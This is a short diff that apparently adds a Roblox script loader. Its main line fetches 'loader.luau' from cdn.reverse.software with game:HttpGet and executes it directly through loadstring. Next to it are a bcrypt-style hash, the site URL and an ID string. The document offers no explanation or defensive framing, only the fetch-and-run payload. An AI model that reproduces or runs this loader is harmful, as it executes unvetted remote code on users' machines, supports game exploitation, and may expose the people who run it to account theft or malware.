@@ -1,0 +1,4 @@
+$2b$10$DN/uaHiHdCObwDA84oaXXOAhjt7H9IwEBsv5LiSoQS6hQ7eZ.Cj36
+https://reverse.software
+ID="4ea66838-2b5b-414d-8652-30978bd9262e";
+loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
